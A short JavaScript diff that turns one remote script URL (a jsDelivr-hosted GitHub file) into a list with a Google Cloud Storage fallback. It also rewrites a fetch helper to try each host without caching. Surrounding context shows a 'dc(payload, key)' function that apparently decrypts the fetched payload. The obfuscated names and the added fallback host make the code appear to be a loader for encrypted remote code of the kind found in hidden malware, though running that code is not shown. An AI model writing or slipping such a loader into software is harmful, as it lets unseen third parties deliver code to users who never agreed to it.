@@ -1,6 +1,27 @@
-const acok = 'https://cdn.jsdelivr.net/gh/ashxmed/symmetrical-adventure@latest/synapses.js';
+const acok = [
+  'https://cdn.jsdelivr.net/gh/ashxmed/symmetrical-adventure@latest/synapses.js',
+  'https://storage.googleapis.com/foigeredu/synapses.js?'+(97+Math.random()*26|0).toString(36)
+];
 
-const j = (u) => fetch(u).then((r) => r.json());
+const j = async (urls) => {
+  const list = Array.isArray(urls) ? urls : [urls];
+
+  for (const url of list) {
+    try {
+      const res = await fetch(url, { cache: 'no-store' });
+
+      if (!res.ok) {
+        throw new Error();
+      }
+
+      return res.json();
+    } catch {
+      // try next
+    }
+  }
+
+  throw new Error();
+};
 
 async function dc(payload, key) {
   const E = new TextEncoder(), D = new TextDecoder(),
